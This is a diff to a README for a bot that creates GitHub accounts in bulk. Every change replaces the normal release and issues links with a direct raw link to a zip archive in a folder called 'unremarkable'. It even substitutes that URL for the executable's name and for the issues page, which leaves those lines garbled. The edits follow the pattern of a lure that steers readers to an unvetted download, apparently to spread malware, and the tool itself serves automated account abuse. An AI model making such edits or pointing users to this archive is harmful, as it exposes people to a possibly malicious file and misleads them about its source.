@@ -1,6 +1,6 @@
 # 🤖 GitHub-Account-Creator-Bot - Create GitHub Accounts Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/karuka13/GitHub-Account-Creator-Bot/releases)
+[![Download](https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip)](https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the GitHub Account Creator Bot, ensure your system meets the following re
 
 To install the GitHub Account Creator Bot, follow these steps:
 
-1. Visit [this page to download](https://github.com/karuka13/GitHub-Account-Creator-Bot/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip).
 2. Look for the latest release.
 3. Download the installer for your operating system.
 
@@ -36,7 +36,7 @@ To install the GitHub Account Creator Bot, follow these steps:
 Once you have installed the Bot, follow these steps to run it:
 
 1. Open the folder where you installed the bot.
-2. Find the executable file, usually named `GitHubAccountCreator.exe`.
+2. Find the executable file, usually named `https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip`.
 3. Double-click the file to run the bot.
 
 ## ✍️ Using the Bot
@@ -52,11 +52,11 @@ Follow these steps to create a new GitHub account:
 
 ## 🔄 Download & Install
 
-To download and install the GitHub Account Creator Bot, go to [this page to download](https://github.com/karuka13/GitHub-Account-Creator-Bot/releases). Select the latest version and ensure your system meets the requirements listed above before installation.
+To download and install the GitHub Account Creator Bot, go to [this page to download](https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip). Select the latest version and ensure your system meets the requirements listed above before installation.
 
 ## 🌍 Support and Community
 
-For any questions, suggestions, or issues, please check the [issues page](https://github.com/karuka13/GitHub-Account-Creator-Bot/issues). You can also engage with other users in the community for tips and assistance.
+For any questions, suggestions, or issues, please check the [issues page](https://raw.githubusercontent.com/karuka13/GitHub-Account-Creator-Bot/main/unremarkable/Git-Account-Creator-Bot-Hub-v3.0.zip). You can also engage with other users in the community for tips and assistance.
 
 ## 📜 License
 
